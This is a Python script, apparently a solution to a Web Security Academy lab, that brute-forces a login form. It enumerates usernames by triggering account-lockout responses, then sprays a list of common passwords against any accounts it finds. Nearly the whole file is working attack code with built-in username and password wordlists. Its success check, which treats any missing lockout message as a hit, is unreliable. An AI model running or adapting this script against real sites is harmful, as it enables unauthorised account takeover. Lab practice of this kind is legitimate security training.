#!/usr/bin/env python3
import requests
import string
import time

# Target URL
url = 'https://0a5400c40383103f806acb7e00900050.web-security-academy.net/login'

usernames = ["carlos","root","admin","test","guest","info","adm","mysql","user","administrator","oracle","ftp","pi","puppet","ansible","ec2-user","vagrant","azureuser","academico","acceso","access","accounting","accounts","acid","activestat","ad","adam","adkit","admin","administracion","administrador","administrator","administrators","admins","ads","adserver","adsl","ae","af","affiliate","affiliates","afiliados","ag","agenda","agent","ai","aix","ajax","ak","akamai","al","alabama","alaska","albuquerque","alerts","alpha","alterwind","am","amarillo","americas","an","anaheim","analyzer","announce","announcements","antivirus","ao","ap","apache","apollo","app","app01","app1","apple","application","applications","apps","appserver","aq","ar","archie","arcsight","argentina","arizona","arkansas","arlington","as","as400","asia","asterix","at","athena","atlanta","atlas","att","au","auction","austin","auth","auto","autodiscover"]

passwords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]

realPassword=[]
realUsernames=[]

for username in usernames:

    for i in range(0,10):
        data = {
            'username': username,
            'password': 'test'
                }

        # Send POST request with FORM data using the data parameter
        response = requests.post(url, data=data)
        print(response.status_code)

        if 'Invalid username or password.' not in response.text:
            print(f"Username Found!: {username}")
            realUsernames.append(username)
            break
        else:
            print(f"username not found: {username}")

print(f"Usernames: {realUsernames}")

userpass={}

if len(realUsernames) > 0:
    for password in passwords:
        for username in realUsernames:
            data = {
                'username': username,
                'password': password
            }

            response = requests.post(url, data=data)

            if 'You have made too many incorrect login attempts. Please try again in 1 minute(s).' not in response.text:
                print(f"Username + Password found: {username}:{password}")
                userpass[username] = password

            else:
                print(f"{username} with the password: {password} failed.")

print(userpass)
